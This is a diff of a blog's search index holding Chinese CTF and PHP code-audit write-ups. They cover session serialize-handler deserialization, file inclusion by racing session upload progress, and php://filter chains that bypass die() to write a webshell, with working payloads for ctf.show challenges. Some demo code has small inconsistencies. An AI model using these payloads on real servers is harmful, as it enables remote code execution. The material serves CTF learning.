+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://f3c16bd0-8f13-4d36-84b1-193366ace33c.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029110308380.png" alt="image-20211029110308380"></p>
-<p>此处键值长度为35,35对应的ASCII码为<code>#</code>，因此最终的结果便成了ascii吗将内容注释为空</p>
-<h4 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h4><p>当<code>ini_set(&#39;session.serialize_header&#39;,&#39;php_serialize&#39;)</code>时</p>
-<p>demo:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029111810927.png" alt="image-20211029111810927"></p>
-<p>序列化后a:1表示$_session数组中存在一个元素，{}中为其参数名与值</p>
-<h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>利用<code>ryat</code>师傅提出的payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action =“ upload.php” method =“ POST” enctype =“ multipart / form-data”&gt;</span><br><span class="line">    &lt;input type =“ hidden” name =“ PHP_SESSION_UPLOAD_PROGRESS” value =“ ryat” /&gt;</span><br><span class="line">    &lt;input type =“ file” name =“ file” /&gt;</span><br><span class="line">    &lt;input type =“ submit” /&gt;</span><br><span class="line">&lt;/ form&gt;</span><br></pre></td></tr></table></figure>
-
-<p>提交后，<code>$_SESSION</code>中的键值就会为$_SESSION[‘upload_progress_ryat’] 在会话上传过程中，将会话数据进行序列化/反序列化，序列化格式会由<code>php.ini</code>中的<code>session.serialize_hander</code>选项设置，由此可知，若在脚本文件中设置不同的serialize_handler，那么可以导致注入任意<code>session</code>数据。</p>
-<p>上面的解释可能看起来有些绕，简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
-<p>其威海店在于<code>session.serialize_handler=php_serialize</code>存储的字符可以引入| ,但当以<code>session.serialize_handler=php</code>格式取出<code>$_session</code>值时,<code>|</code>会被当做键值对的分隔符，造成键、值数目错误，会在特定的地方造成反序列化漏洞</p>
-<p>demo：</p>
-<p>利用session.php文件，用于传入session值，文件内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>其session内容如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;session&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其另一个class.php文件如下:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">  ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Class1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Who are you?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$str</span> = <span class="keyword">new</span> test();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>此处运行实例化后，输出test</p>
-<p><code>session.php</code> 文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的session值，class.php文件的作用是在对象unserialize()之前进行调用输出<code>who are you</code>，反序列化结束后，输出name值</p>
-<p>这两个文件想要利用反序列化session漏洞，我们需要在session.php文件传入<code>|</code>与<code>序列化格式的值</code>，然后再次访问class.php时，就会调用session值，以php处理器的格式取出session，从而引发反序列化漏洞。</p>
-<p>首先生成序列化字符串</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">//触发反序列化时，调用__wakeup()打印输出字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;who are you&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对象运行完成，打印name值</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="keyword">$this</span>-&gt;<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建实例str</span></span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">new</span> Class2();</span><br><span class="line"><span class="comment">//对实例name赋值</span></span><br><span class="line"><span class="variable">$str</span>-&gt;name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="comment">//序列化对象</span></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
-
-<p>拿到payload:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Class1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-5.assets/image-20211029123051359.png" alt="image-20211029123051359"></p>
-<p>将其传入index.php</p>
+<p>cookie处添加<code>PHPSESSID=flag</code> ，在PHP_SESSION_UPLOAD_PROGRESS下添加恶意代码；此时由于PHP的<code>session.use_strict_mode</code>模式默认关闭，生成的session文件将会是<code>sess_flag</code> 同时<code>Linux PHP</code>默认将sess文件存放于/tmp目录下</p>
+<p><strong>竞争1</strong></p>
+<p>利用bp不停写入sess文件</p>
+<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213842165.png" alt="image-20211030213842165"></p>
+<p><strong>竞争2</strong></p>
+<p>在sess文件被删除之前，请求包含，获得命令相应</p>
+<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213929939.png" alt="image-20211030213929939"></p>
+<p>利用竞争，执行命令从而拿到fl0g.php中的flag</p>
 ]]></content>
       <categories>
-        <category>代码审计</category>
+        <category>ctf</category>
       </categories>
       <tags>
-        <tag>代码审计</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1467,43 +1457,53 @@
       </tags>
   </entry>
   <entry>
-    <title>利用session.upload_progress进行文件包含</title>
-    <url>/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>
+    <title>利用php伪协议绕过die()</title>
+    <url>/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/</url>
+    <content><![CDATA[<p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$contnet</span>)</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php die()&quot;</span>.<span class="variable">$contnet</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$contnet</span>.<span class="string">&#x27;\nxxxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030211326157.png" alt="image-20211030211326157"></p>
-<p>我们可以利用<code>session.upload_progress</code> 将木马写入session文件，然后包含这个文件。但是首先我们需要知道session文件将会保存在何处</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在Linux php中 session文件默认保存在/tmp/sess_session名中</span><br></pre></td></tr></table></figure>
-
-<p>以及会如何保存</p>
+<p>此处我们可以利用php://filter协议，将文件内容中的die或exit解码掉，以便执行后方的其他语句。</p>
+<p><strong>文件名、内容皆可控</strong></p>
+<p><strong>base64编码绕过</strong></p>
+<p>利用base64编码解码，将exit die解码为乱码，将恶意代码解码还原。</p>
+<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110309150.png" alt="image-20211031110309150"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030212042701.png" alt="image-20211030212042701"></p>
-<p>默认<code>session.use_strict_mode</code>为off状态，也就是说，用户可以在浏览器或者Burpsuit中自定义session ID值用于指明sess文件名。</p>
-<p>但是<code>session.upload_progress.cleanup</code>值为默认开启状态</p>
-<p>当<code>session.upload_progress.cleanup</code>默认开启时，一旦读取了所有的POST数据，便会清除session文件。</p>
-<p>此处我们可以利用条件竞争的方式进行利用文件上传，生成sess文件，趁着sess文件还未删除，进行包含利用。</p>
-<p>CTFshow web入门 web82                     </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p><strong>2、rot13编码绕过</strong></p>
+<p>原理与base64解码绕过一致，将die解码为不可识别语句，但此方法需要服务器未开启短标签功能，若开启，就会被解析，后方的代码便会报错失去效果。</p>
+<p>本地环境报错。</p>
+<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110649789.png" alt="image-20211031110649789"></p>
+<p><strong>过滤器编码套娃使用</strong></p>
+<p>利用过滤器嵌套过滤器，使得写入的内容层层解密，最后写入我们预期的代码。</p>
+<p><strong>strip_tags|base64-decode去除标签后解密base64</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=shell.php</span></span><br><span class="line">?contnet=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
 
-<p>此处可以看出，题目排除了<code>php://</code>、<code>data://</code>、<code>日志包含</code>的手法进行getshell，此处尝试利用<code>PHP_UPLOAD_PROGRESS</code>进行getshell</p>
-<p>此处利用<code>php.net</code>提供的上传栏代码加以修改:</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://f3c16bd0-8f13-4d36-84b1-193366ace33c.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031112033989.png" alt="image-20211031112033989"></p>
+<p>但此方法在php7环境上会由于string.strip_tags的问题发生错误，从而导致无法写入shell，但在php5的环境下不会受此影响.</p>
+<p>测试demo ctfshow web入门87：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>cookie处添加<code>PHPSESSID=flag</code> ，在PHP_SESSION_UPLOAD_PROGRESS下添加恶意代码；此时由于PHP的<code>session.use_strict_mode</code>模式默认关闭，生成的session文件将会是<code>sess_flag</code> 同时<code>Linux PHP</code>默认将sess文件存放于/tmp目录下</p>
-<p><strong>竞争1</strong></p>
-<p>利用bp不停写入sess文件</p>
-<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213842165.png" alt="image-20211030213842165"></p>
-<p><strong>竞争2</strong></p>
-<p>在sess文件被删除之前，请求包含，获得命令相应</p>
-<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030213929939.png" alt="image-20211030213929939"></p>
-<p>利用竞争，执行命令从而拿到fl0g.php中的flag</p>
+<p>此处题目利用file_put_content写文件，并过滤了<code>php</code>、<code>data</code>等关键词，但由于存在urldecode函数，我们可以使用二次url编码绕过;内容处，于文件首写入die(),我们需要绕过die才可执行任意命令。</p>
+<p>利用<code>php://filter/writ=convert.base64-decode/resource=shell.php</code> 伪协议将即将写入的内容base64解码，将<code>&lt;?php die(xxx);?&gt;</code>解码为无意义的乱码，使得php无法识别，再将base64编码后的<code>&lt;?php system($_POST[&#39;cmd&#39;]);?&gt;</code>写入以便执行系统命令。</p>
+<p>需要注意的是，由于base64_decode识别机制类似于下方代码，只会识别64个可打印字符</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>而在<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>中，base64_decode会将其他字符略去，只对<code>php die</code>进行解码操作,同时，base64编码4位一组，需在恶意代码前添加两个字符用于解码，用于避免恶意代码解码错误。</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br><span class="line">POST:content=aaPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031105448496.png" alt="image-20211031105448496"></p>
+<p>参考文章:</p>
+<p><a href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
 ]]></content>
       <categories>
-        <category>ctf</category>
+        <category>代码审计</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>代码审计</tag>
       </tags>
   </entry>
   <entry>
